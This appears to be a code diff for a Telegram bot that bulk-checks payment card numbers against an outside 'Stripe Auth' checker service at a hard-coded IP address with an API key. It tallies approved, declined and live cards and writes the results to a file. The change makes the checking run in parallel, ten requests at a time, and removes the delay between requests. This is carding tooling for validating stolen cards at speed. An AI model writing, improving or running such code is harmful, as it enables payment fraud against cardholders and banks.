@@ -2024,7 +2024,6 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ─── Background Task ──────────────────────────────
-
 import asyncio
 import aiohttp
 import os
@@ -2109,10 +2108,11 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     # Send initial progress message
+    estimated_time = max(len(cards) * 0.5, 1) # A rough, more realistic estimate
     try:
         processing_msg = await update.message.reply_text(
             f"━━ ⚡𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵⚡ ━━\n"
-            f"💳 Total Cards: {len(cards)} | ⌚ Estimated Time: ~{len(cards)*2}s\n"
+            f"💳 Total Cards: {len(cards)} | ⌚ Estimated Time: ~{estimated_time:.0f}s\n"
             f"╭─────────────╮\n"
             f"│ [□□□□□□□□□□] 0/{len(cards)} │\n"
             f"╰──────────────────╯"
@@ -2128,31 +2128,65 @@ async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def background_check_multi(update, context, cards, processing_msg):
     """
     Performs the background card check and handles all status updates and file output.
+    This version processes cards in parallel.
     """
     results = []
-    approved = declined = ccn_live = threed = 0
+    approved = 0
+    declined = 0
+    ccn_live = 0
+    threed = 0
     total = len(cards)
 
     async def escape_md(text):
         special_chars = r'\_*[]()~`>#+-=|{}.!'
         return re.sub(f"([{re.escape(special_chars)}])", r"\\\1", text)
 
+    async def check_card_with_semaphore(session, card, semaphore):
+        """Wrapper to acquire semaphore before making an API call."""
+        async with semaphore:
+            return await check_card(session, card)
+
+    async def check_card(session, card):
+        """Makes the API call and returns the card and JSON response."""
+        try:
+            async with session.get(
+                f"http://31.97.66.195:8000/?key=k4linuxx&card={card}",
+                timeout=20
+            ) as resp:
+                return card, await resp.json()
+        except Exception as e:
+            return card, {"status": f"Error: {str(e)}"}
+
+    async def update_progress(current_count):
+        """Updates the progress message with the current count."""
+        filled_len = round((current_count / total) * 10)
+        empty_len = 10 - filled_len
+        bar = "■" * filled_len + "□" * empty_len
+        
+        progress_text = (
+            f"━━ ⚡𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵⚡ ━━\n"
+            f"💳 Total Cards: {total} | ✅ Checked: {current_count}/{total}\n"
+            f"╭─────────────╮\n"
+            f"│ [{bar}] │\n"
+            f"╰──────────────────╯"
+        )
+        try:
+            await processing_msg.edit_text(await escape_md(progress_text), parse_mode=ParseMode.MARKDOWN_V2)
+        except Exception:
+            pass
+
+    # --- Main parallel processing logic ---
     async with aiohttp.ClientSession() as session:
-        async def check_card(card):
-            try:
-                async with session.get(
-                    f"http://31.97.66.195:8000/?key=k4linuxx&card={card}",
-                    timeout=20
-                ) as resp:
-                    data = await resp.json()
-                    return data.get("status", "Unknown")
-            except Exception as e:
-                return f"Error: {str(e)}"
+        # Limit concurrent requests to 10
+        semaphore = asyncio.Semaphore(10)
+        tasks = [check_card_with_semaphore(session, card, semaphore) for card in cards]
 
-        for i, card in enumerate(cards, start=1):
-            status = normalize_status_text(await check_card(card))
-
-            # Proper status checking and counting based on your demands
+        for i, task in enumerate(asyncio.as_completed(tasks)):
+            card, api_response = await task
+            
+            status = normalize_status_text(api_response.get("status", "Unknown"))
+            
+            # Update counts
             if "Approved" in status:
                 approved += 1
             elif "Incorrect Card Number" in status or "Declined" in status:
@@ -2163,28 +2197,9 @@ async def background_check_multi(update, context, cards, processing_msg):
                 ccn_live += 1
             
             results.append(f"{card} -> {status}")
-
-            # Progress bar update
-            filled_len = round((i / total) * 10)
-            empty_len = 10 - filled_len
-            bar = "■" * filled_len + "□" * empty_len
             
-            # --- MODIFICATION: Updated progress bar text ---
-            eta_seconds = (total - i) * 2
-            progress_text = (
-                f"━━ ⚡𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵⚡ ━━\n"
-                f"💳 Total Cards: {total} | ✅ Checked: {i}/{total} | ⌚ ETA: ~{eta_seconds}s\n"
-                f"╭─────────────╮\n"
-                f"│ [{bar}] │\n"
-                f"╰──────────────────╯"
-            )
-
-            try:
-                await processing_msg.edit_text(await escape_md(progress_text), parse_mode=ParseMode.MARKDOWN_V2)
-            except Exception:
-                pass
-
-            await asyncio.sleep(1)
+            # Update progress message after each card is checked
+            await update_progress(len(results))
 
     # Save results to a fixed filename: checked.txt
     output_filename = "checked.txt"
@@ -2223,7 +2238,6 @@ async def background_check_multi(update, context, cards, processing_msg):
         os.remove(output_filename)
     except Exception:
         pass
-
 
 
 from faker import Faker
